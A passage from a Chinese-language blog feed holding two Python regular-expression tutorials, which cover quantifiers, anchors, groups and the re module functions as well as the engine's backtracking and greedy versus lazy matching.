class="number">13</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d\d&#x27;</span>, <span class="string">&#x27;速度与激情4&#x27;</span>).group()</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">13</span>-bc99d57c6a2a&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d\d&#x27;</span>, <span class="string">&#x27;速度与激情4&#x27;</span>).group()</span><br></pre></td></tr></table></figure><p>使用大括号来限制前面的单个字符有多少个。</p><p> 匹配 1 到 8 位数字，至少匹配 1 个数字，至多匹配 4 个数字</p><p> 匹配 11 个连续的数字，中间不能有别的字符。</p><p>g{1,3} 匹配至少 1 个，至多 2 个字符 g</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">15</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d&#123;1,2&#125;&#x27;</span>, <span class="string">&#x27;速度与激情3&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">15</span>]: <span class="string">&#x27;速度与激情3&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d&#123;1,2&#125;&#x27;</span>, <span class="string">&#x27;速度与激情45&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">&#x27;速度与激情45&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;速度与激情4568&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">17</span>]: <span class="string">&#x27;速度与激情4568&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;速度与激情45a68&#x27;</span>).group()</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">18</span>-c9758e381471&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;速度与激情45a68&#x27;</span>).group()</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情a&#123;4&#125;&#x27;</span>, <span class="string">&#x27;速度与激情aaaa&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">27</span>]: <span class="string">&#x27;速度与激情aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">28</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情a&#123;1,4&#125;&#x27;</span>, <span class="string">&#x27;速度与激情aaaa&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">28</span>]: <span class="string">&#x27;速度与激情aaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情a&#123;1,4&#125;&#x27;</span>, <span class="string">&#x27;速度与激情aaa&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">29</span>]: <span class="string">&#x27;速度与激情aaa&#x27;</span></span><br></pre></td></tr></table></figure><p>? 前面的字符出现一次或零次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">33</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;021-?\d&#123;8&#125;&#x27;</span>, <span class="string">&#x27;021-12345678&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">33</span>]: <span class="string">&#x27;021-12345678&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;021-?\d&#123;8&#125;&#x27;</span>, <span class="string">&#x27;02112345678&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">34</span>]: <span class="string">&#x27;02112345678&#x27;</span></span><br></pre></td></tr></table></figure><p>注意：三个双引号是字符串，放在函数下面，可以当作函数的说明。放到类的下面，可以看作是类的说明。</p><p>要想匹配所有字符，包括 ，可以使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">52</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;.*&#x27;</span>,html_content,re.S).group()</span><br></pre></td></tr></table></figure><p>单独使用 <code>.*</code>只能匹配单行所有字符（有无），一旦遇到换行符就停止匹配了。可以加一个参数<code>re.S</code></p><p>+ 与 * 的区别： 前者不能匹配 空字符，后者可以匹配空字符</p><h1 id="位置锚定">6. 位置锚定</h1><table><thead><tr class="header"><th style="text-align: center;">字符</th><th style="text-align: left;">功能</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">^</td><td style="text-align: left;">匹配字符串开头</td></tr><tr class="even"><td style="text-align: center;">$</td><td style="text-align: left;">匹配字符串结尾</td></tr></tbody></table><p>配一个单词边界，也就是指单词和空格间的位置。例如，“er可以匹配“never”中的“er”，但不能匹配“verb”中的“er”。匹配非单词边界。“例如：er”能匹配“verb”中的“er”，但不能匹配“never”中的“er”。</p><p>为什么不写^ 也能匹配开头，因为 python 的 match函数**自动**从开头开始匹配，但是不会默认自动匹配到结尾。但是其他语言的函数不一定这样做。所以如果想要匹配整个字符串的还，一般开头写上^, 结尾写上 $</p><p>比如：判断变量名是否有效 问题中，以下代码就不能判断类似：‘a#ss’等在中间出现不正常字符的变量名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;[a-zA-Z_][\w]*&#x27;</span>, name)</span><br></pre></td></tr></table></figure><p>改成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z_][\w]*$&#x27;</span>, name)</span><br></pre></td></tr></table></figure><p>练习：匹配 4-13 个前缀（字母数字下划线）并以@163.com结尾的邮箱，正则为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9_]&#123;4,20&#125;@163\.com$&#x27;</span>, mail)</span><br></pre></td></tr></table></figure><p>⚠️ 注意：</p><ol type="1"><li>如果要全字符串匹配，不要忘记在最后使用 $ 符号</li><li>如果要在字符串中匹配那些正则表达式用到的字符，需要使用反斜杠进行转义。</li></ol><h1 id="匹配分组">7. 匹配分组</h1><table><thead><tr class="header"><th style="text-align: center;">字符</th><th style="text-align: left;">功能</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">|</td><td style="text-align: left;">匹配左右任意一个表达式</td></tr><tr class="even"><td style="text-align: center;">(ab)</td><td style="text-align: left;">将括号中字符作为一个分组</td></tr><tr class="odd"><td style="text-align: center;"><code>\num</code></td><td style="text-align: left;">引用分组 num 匹配到的字符串</td></tr><tr class="even"><td style="text-align: center;"><code>(?P)</code></td><td style="text-align: left;">分组起别名</td></tr><tr class="odd"><td style="text-align: center;">(?P=name)</td><td style="text-align: left;">引用别名为 name 分组匹配到的字符串</td></tr></tbody></table><p>小括号有两个功能：</p><ol type="1"><li><p>分组匹配</p></li><li><p>单独取出小括号中的值</p><p>想要取某个位置的值，就给它加个括号。想要取第 n 个括号里面的东西，就用group(n).</p><p>如果括号的个数为 m，你用 group(m+1) 会引发异常。</p></li></ol><p>注意：测试过程中为了简洁起见，有时会使用 re.match().group()这样的写法。正常开发代码的时候，需要分开写。因为前者会产生异常。</p><p>对上次写的匹配邮箱的正则进行改进，匹配多种邮箱：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9_]&#123;4,20&#125;@(qq|outlook|163|gmail|126)\.com$&#x27;</span>, mail)</span><br></pre></td></tr></table></figure><p>注意：如果不写括号，那程序会默认将 |前后的两大部分看成两个分组，而这并不是我们想要的。</p><p>分组的另一个应用：</p><p>判断 html_str = "<code>&lt;h1&gt;hello wrold&lt;/h1&gt;</code>"中开闭标签是否配对</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="keyword">match</span>(<span class="string">r&#x27;&lt;(\w*)&gt;.*&lt;/\1&gt;&#x27;</span>,html_str)</span><br></pre></td></tr></table></figure><p>因为想取某个位置的值，所以给他加上分组 ()，然后后面使用的时候，看他是第几个分组，就用 <code>\几</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]:  html_str=<span class="string">&#x27;&lt;body&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;/body&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;&lt;(\w*)&gt;&lt;(\w*)&gt;.*&lt;/\2&gt;&lt;/\1&gt;&#x27;</span>,html_str)</span><br><span class="line">Out[<span class="number">10</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">27</span>), <span class="keyword">match</span>=<span class="string">&#x27;&lt;body&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;/body&gt;&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>或者当分组过多时，数数并不方面，可以使用别名：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;&lt;(?P&lt;p1&gt;\w*)&gt;&lt;(?P&lt;p2&gt;\w*)&gt;.*&lt;/(?P=p2)&gt;&lt;/(?P=p1)&gt;&#x27;</span>,html_str)</span><br><span class="line">Out[<span class="number">17</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">27</span>), <span class="keyword">match</span>=<span class="string">&#x27;&lt;body&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;/body&gt;&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="re-模块的高级用法">8. re 模块的高级用法</h1><p>上面的大部分正则知识，在其他语言中基本都有。而这一节 ‘re模块的高级用法’是 python 特有的，其他的语言可能没有。</p><h2 id="search">8.1. search()</h2><p>match() 是默认要求从头开始匹配，而 search不是，它只是匹配字串中<strong>第一次</strong>出现符合正则匹配项的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: re.search(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;阅读次数:7887, 点赞数:454&quot;</span>).group()</span><br><span class="line">Out[<span class="number">28</span>]: <span class="string">&#x27;7887&#x27;</span></span><br></pre></td></tr></table></figure><p>当然，在 search 的正则中加上 ^，就和 match 一样了。</p><h2 id="findall">8.2. findall()</h2><p>search 是只匹配符合正则的第一个字串，而 findall是返回所有匹配正则的数据，返回值为列表。</p><p>一般在网页批量获取特定格式的数据时，经常使用它</p><p><strong>⚠️：获取 findall 的返回结果不需要使用 group()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">73</span>]: re.findall(<span class="string">r&#x27;\d+&#x27;</span>,<span class="string">&#x27;python = 999, c = 22,c++ = 1212&#x27;</span>)</span><br><span class="line">Out[<span class="number">73</span>]: [<span class="string">&#x27;999&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;1212&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="sub">8.3. sub()</h2><ol type="1"><li>将正则表达式匹配到的数据，替换为你输入的参数值</li><li>支持函数调用</li></ol><p>匹配替换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">74</span>]: re.sub(<span class="string">r&#x27;\d+&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;python = 999, c = 22,c++ = 1212&#x27;</span>)</span><br><span class="line">Out[<span class="number">74</span>]: <span class="string">&#x27;python = hello, c = hello,c++ = hello&#x27;</span></span><br></pre></td></tr></table></figure><p>函数调用：</p><p>匹配到符合条件的字串时，自动调用函数。将正则匹配的返回对象传到函数中。并接受该函数的返回值来替换匹配到的东西。</p><h2 id="split">8.4. split()</h2><p>根据匹配进行切割字符串，并返回一个列表。</p><p>练习：将冒号或空格作为分隔符，分割字符串：“info:xiaoZhang 33shandong”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re。</span><br></pre></td></tr></table></figure><p>https://www.jianshu.com/p/9860f951616e</p><h2 id="look-ahead-look-behind">look ahead look behind</h2><p>常常用于计数： <ahref="https://www.hackerrank.com/challenges/find-a-string/problem">Finda string</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    original_str = <span class="built_in">input</span>()</span><br><span class="line">    substring = <span class="built_in">input</span>()</span><br><span class="line">    a, b = substring[:-<span class="number">1</span>], substring[-<span class="number">1</span>]</span><br><span class="line">    pattern = <span class="string">rf&quot;<span class="subst">&#123;a&#125;</span>(?=<span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line">    matches = re.findall(pattern, original_str)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(matches))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>当然，此题目更适合用简单遍历匹配解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">count_substring</span>(<span class="params">string, sub_string</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string)):</span><br><span class="line">        <span class="keyword">if</span> (string[i:i+<span class="built_in">len</span>(sub_string)] == sub_string):</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">s=<span class="built_in">input</span>()</span><br><span class="line">sub=<span class="built_in">input</span>()</span><br><span class="line">count_substring(s, sub)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Regexp 原理与语法</title>
      <link href="/blog/2021/06/16/programming/python/re_principle/"/>
      <url>/blog/2021/06/16/programming/python/re_principle/</url>
      
        <content type="html"><![CDATA[<p>本文并未覆盖 Python正则的全部知识，网上优秀的教程很多，无需重复，这里只记录一些易忘点、难点以及好的索引链接</p><h2 id="online-regexp-debug">Online RegExp Debug</h2><p><a href="https://www.regex101.com">regex101</a>注意测试时，在右侧的语言栏选择 Pyhton <ahref="https://www.debuggex.com">debuggex</a> <ahref="https://jex.im/regulex">JavaScript Regular ExpressionVisualizer.</a></p><h2 id="好的资料">好的资料</h2><p><ahref="https://learning.oreilly.com/videos/2018-python-regular/9781789539523">2018Python Regular Expressions - Real World Projects</a></p><p><ahref="https://github.com/ziishaned/learn-regex/blob/master/README.md">learn-regexthe easyest way</a></p><p>这两个资料我是依次都看完了的。第一个是 oreilly的课程，深入潜出，是我第一次完整地学完一套英文教程，很是欣喜。第一个教程(几乎)没有讲 lookahead 和 lookbehind 等 zero-width assertion知识，因此，我找到第二个资料，把它看了一遍。</p><p>只看教程，不动手学不好，如果暂时找不到实际项目用处，可以先刷一刷题目，各大刷题网站均可，我当时刷的<ahref="https://www.hackerrank.com/">hackerrank</a>（为啥？因为我当时谷歌英文搜索正则练习题目的时候，它排在前面，哈哈)</p><h2 id="python-regular-expression-terminology">Python Regular ExpressionTerminology</h2><ul><li>Pattern - A text pattern of interest expressed in Regular ExpressionLanguage</li><li>Text – String in which to look for a match with a given pattern</li><li>Regex Engine - Regular Expression Engine that does the actualwork</li><li>Regex Module – Python module for interacting with Regex Engine.</li></ul><p>Module: re</p><h2 id="基本使用">基本使用</h2><ol type="1"><li><p>re 模块简单使用</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: test = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ...: hello 12 world</span></span><br><span class="line"><span class="string">    ...: Goodbye 224 world</span></span><br><span class="line"><span class="string">    ...: h yet anothet &#x27;h&#x27;</span></span><br><span class="line"><span class="string">    ...: &quot;&quot;&quot;</span></span><br><span class="line">In [<span class="number">15</span>]: pattern = <span class="string">r&quot;\d&#123;1,&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: match_obj = re.search(pattern, test)</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: <span class="built_in">print</span>(match_obj)</span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">7</span>, <span class="number">9</span>), <span class="keyword">match</span>=<span class="string">&#x27;12&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: <span class="built_in">print</span>(match_obj.group())</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure></p></li></ol><p>详细的 Python 正则函数与方法的使用等在另一篇博文写。</p><h2 id="原始字符串">原始字符串</h2><p>为什么 pattern 写的时候，需要使用原始字符串？</p><ul class="task-list"><li><label><input type="checkbox" />写清楚</label></li></ul><p><a href="https://www.jianshu.com/p/21e2cfb7f829">Python 中有关rawString(raw 字符串)的理解</a> <ahref="https://docs.python.org/2/library/re.html">7.2. re — Regularexpression operations</a></p><h2 id="注意事项">注意事项</h2><h3 id="reserved-characters">Reserved characters</h3><ol type="1"><li><p>Reserved characters such as<code>&#123; &#125; [ ] / \ + * . $ ^ | ?</code> will not be reserverd in sets,which means there is no need to escape Reserved characters in sets.例如, <code>[(+*)]</code> 将匹配任何文字字符 '(' , '+' , '*' 或 ')'。</p></li><li><p>Reserved characters in group or Zero-width assertions still needto be escaped</p></li><li><p><code>|</code> An alternator at this position effectivelytruncates the entire pattern, rendering any other tokens beyond thispoint useless</p></li><li><p>引号并不影响 <code>\b</code>边界的匹配，就是说，即使一个单词挨着多个引号，正则引擎也会把匹配该单词。</p></li><li><p><code>^、$</code>将逐个输入作为一个字符串，只作用于该字符串的开头和结尾，如果你想要把每一行单独对待，匹配它们的开头，则需要使用<code>m</code> flag当匹配开头/结尾时，如果想将每行的开头/结尾单独出来看，也可使用multi-mode inline option</p></li><li><p>对于取反, <code>^</code> 需要是<code>[]</code> 中开头第一个字符,否则它就变成了字面意思的 <code>^</code>。</p></li></ol><h3 id="conditional-expression">Conditional Expression</h3><p>Learn about branching in regular expressions.</p><p>if ... then ... else： n -&gt; group number name -&gt; group name</p><p><code>(?(n)yes_expression | no_expression)</code><code>(?(name)yes_expression | no_expression)</code></p><p>如果 group n 或者 group name 的条件满足了，那么就执行 yes_expression,否则执行 no_expression</p><p>这个就像 (A|B) 的升级版， (A|B) 是或者 A 或者 B，而它加一个<code>?(n)</code>，对前面的分组进行判断，就成为了((?(n))A|B)。</p><h4 id="example">Example</h4><p>if starting character is digit, text need to 3 digits else text neadsto be 4 letters</p><p>Pattern 1: <code>\b(\d)?(?(1)\d&#123;2&#125;|[a-z]&#123;4&#125;)\b</code> 如果 ?(1) group1，即： 满足了，那么执行 匹配，否则执行[a-z]{4}，然后两边都有 wordboundary.</p><p>Pattern 2：<code>\b(?P&lt;test&gt;\d)(?&lt;test&gt;\d&#123;2&#125;|[a-z]&#123;4&#125;)\b</code></p><p>or simply: <code>\b(\d&#123;3&#125;|[a-z]&#123;4&#125;)\b</code> 匹配 3 个数字或者 4个字符。</p><h2 id="regular-expression-engine---five-key-point">Regular ExpressionEngine - Five Key Point</h2><h3 id="regular-expression-engine-introduction">Regular ExpressionEngine Introduction</h3><p>Python, Perl, .Net Regular Expression Engines属于不确定有限状态自动机（Nondeterministic FiniteAutomation）的一类实现。</p><p>Pattern 驱动着正则引擎处理输入文本，并选择恰当的路径。</p><p>牢记之前的成功状态，以防遇到不完整匹配时，可以退回之前成功匹配的状态，尝试其他路径（这里和自己用c 指针写字符串匹配类似） Regex引擎本质上是通用的，并按照模式中的指示采取路径。它依赖于开发者定义有效的pattern 来指导引擎。</p><h3 id="five-key-points">Five key Points</h3><h4 id="one-character-at-a-time">One Character at a time</h4><p>It compares and matches one character at aa time.</p><h4 id="left-to-right">Left to Right</h4><p>Pattern is traversed left to right. Text also is traversed left toright</p><ul><li>Pattern defined left most is attempted first and gradually movesright to attempt</li><li>All viable Patterns are evaluated before proceeding with nextcharacter in the text.</li></ul><h5 id="example-1">Example</h5><p>Left to Right Problem: Find all words that contain car or carpetPattern: <code>car | carpet</code> Text: carpet and car</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200630174032.png"alt="left2right_one_char_per_time" /><figcaption aria-hidden="true">left2right_one_char_per_time</figcaption></figure><p>Regular Expression Engine will try to match <code>car</code> firstlyone character per time to see it's fully match or not, if can't match,it will backtrack to 'c', and try to match the second choice,'carpet'</p><p>这种写法的结果就是：只匹配到了 <code>car</code> 而匹配不到<code>carpet</code></p><h5 id="pattern-adjust">Pattern Adjust</h5><ol type="1"><li><p>下面我们来修正一下，使其可以正确匹配：</p><p>Pattern: <code>\b(car|carpet)\b</code></p><p>匹配过程： <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200630174421.png"alt="revision" /></p><p>当正则引擎在文本中遇到 <code>carpet</code>时， 先匹配<code>car</code>，逐个字符匹配，<code>c a r</code>然后该匹配边界了，发现为 <code>p</code>不是边界，然后正则引擎沿原路径回溯，准备匹配 <code>carpet</code>路径，逐个字符匹配发现可以，就匹配成功。</p><p>但是，我们可以看出根据 Regexp Engine 遵循的 Left to Right 方式，这种Pattern 在遇到 <code>carpet</code>的时候，仍然需要回溯，这样大大降低了效率。</p></li><li><p>为加深对正则引擎了解，我们再看一下</p><p>Pattern： <code>\bcar|carpet\b</code> 这个 Pattern和修正的只有一对括号的区别，却是正与错的差距。 因为 <code>|</code>会将整个模式分成两半，所以这个 Pattern 基本等同于：<code>(\bcar)|(carpet\b)</code> 的作用。</p></li></ol><h4 id="pattern-adjust-again">Pattern Adjust Again</h4><p>Pattern; <code>\bcar(pet)?\b</code></p><h4 id="summary">Summary</h4><p>Pattern and Text are evaluated Left to Right</p><p>In-order to minimize backtracking, extract common patterns out<code>car(pet)?</code> Write more precise patterns first followed bymore generic patterns</p><h3 id="greedylazy-and-backtracking">Greedy，lazy and Backtracking</h3><p>Greedy -Consume as much of the input text as possible and thengive-up the characters to match rest of the pattern.</p><ul><li>量词 <code>*, +, ?</code> 是贪婪的（greedy），它们会尝试匹配尽可能多的输入文本。(其中 <code>?</code>贪婪和懒惰区别不大)</li><li>有时候，当这些量词应用在像 <code>.</code>这样的通配符上时，会消耗掉你全部的文本，从而导致饿死 Pattern中的后续部分。</li><li>通过在 <code>*, +, ?</code>等后面再加一个问号，即：<code>*?, +?, ??</code>，使其变为懒惰模式。</li><li>Regexp Engine 评估计算， 每次回溯一步，来看它是否能满足 Pattern中的后续部分。</li></ul><h4 id="example-2">Example</h4><p>Problem：Find sentences ending with a number and extract the number.Pattern: <code>.+(\d+)[.!]</code> text： First 1234. Second 5678！</p><p>Regexp Engine 匹配步骤： 首先， <code>.</code> 是贪婪的， 会匹配<code>First 1234. Second 5678！</code> , 然后发现后面的部分:<code>(\d+)[.!]</code> 被饿死了。继而向前回溯一个字符，<code>First 1234. Second 5678</code> , 然后 <code>(\d+)</code>还是被饿死了， 再向前回溯一个字符 <code>First 1234. Second 567</code> ,于是匹配成功。 <code>.+</code> 匹配：<code>First 1234. Second 567</code> , <code>(\d+)</code> 匹配了 8，<code>[.!]</code> 匹配了 <code>！</code></p><h4 id="lazy">Lazy</h4><p>Lazy — Consumes as few input text as possible and then attempts tomatch rest of the patterns</p><p>量词 <code>*, +, ?</code> 是贪婪的</p><ul><li>Quantifiers <code>*,+,?</code> can be turned to Lazy by adding a<code>?</code> After the quantifier</li></ul><p>Example: <code>*?, +?, ??</code></p><ul><li>Idea behind lazy is' to match as few times as possible forquantifiers and proceed to match rest of the pattern</li><li>When there is no match for a pattern, lazy mode backtracks on thepattern and <strong>expands to match more characters ininput.</strong></li></ul><h4 id="example-3">Example</h4><p>Pattern: <code>.+?(\d+)[.!]</code> text： First 1234. Second5678！</p><p>通过 <code>?</code> 使得 <code>+</code> 变成 lazy 模式。lazy 使得<code>.</code> 先匹配尽可能少的， 于是匹配了 F, 然后进行匹配，发现没有数字可以匹配了， 那就 Pattern 向前回溯一步， 接着通过<code>.</code> 匹配， 于是匹配 <code>Fi</code> , 然后再次进行匹配，发现仍然不行，进而 Pattern 再次回溯， Pattern 如此反复回溯， 最终<code>.</code> 匹配了 <code>First</code> , <code>\d</code> 匹配了<code>1234</code> ， 标点符号匹配了 <code>.</code></p><h3 id="groups">Groups</h3><h4 id="indexed-named-non-capturing">Indexed， Named， NonCapturing</h4><p>用处一：</p><p>Break a pattern into sub-patterns; pinpoint location of matchingstring and sub-strings Groups are any pattern specified inside aparenthesis <code>()</code> Reuse common patterns, Mark as optional —minimize backtracking <code>car(pet)?</code></p><p>Extract Values:<code>(?P&lt;year&gt;\d&#123;4&#125;)(?P&lt;month&gt;\d&#123;2&#125;)(?P&lt;day&gt;\d&#123;2&#125;)</code></p><p>用处二： Capture Repeating Sub-Patterns<code>\d+(, \d&#123;3&#125;)*(\.\d&#123;2&#125;)?</code></p><p>Matches： 123.67 123, 456.75 127, 546, 245.58</p><h5 id="indexed-group">Indexed Group</h5><ul><li><p>Capture matching substring</p><p>• Problem: Extract year, month and day from string yyyymmdd •Pattern: ()()() • Text: 20160501</p></li><li><p>Access by group number</p><p>Groups are numbered from left-to-right. Every open parenthesis isassigned anincreasing number starting from 1 Group 0 =&gt; Refers towhole pattern Group 1 =&gt; () Group 2 =&gt; () Group 3 =&gt; () python中 group() 方法默认返回 whole pattern</p></li></ul><h4 id="named-group">Named Group</h4><p>在左括号后加<code>?P&lt;group_name&gt;</code>,例如：<code>(？P&lt;name&gt;\d+?)</code></p><h5 id="non-capturing-groups">Non-Capturing Groups</h5><p>有时候我们使用 group 只是为了匹配，而并不想捕获 group 的值。例如：Groups are used here to capture repeating patterns， 比如上面 pattern 的<code>(,\d&#123;3&#125;)*(\.\d&#123;2&#125;)?</code>两个分组，我们并不关注分组自己的内容，我们使用分组是为了更好地匹配整体。Groupcapture is expensive, turn it off when not needed</p><ul><li><p>Match without group capture</p><p>Problem: Match number of format 999,999,999.99 Capturing GroupsVersion Pattern: <code>\d+(,\d&#123;3&#125;)*(\.\d&#123;2&#125;)?</code> Text:20,198,425.12</p></li></ul><p>方法：在分组 ( ) 内的开头增加 <code>?:</code></p><p>Non-Capturing Group (?:) Pattern:<code>\d+(?:,\d&#123;3&#125;)*(?:\.\d&#123;2&#125;)?</code></p><h4 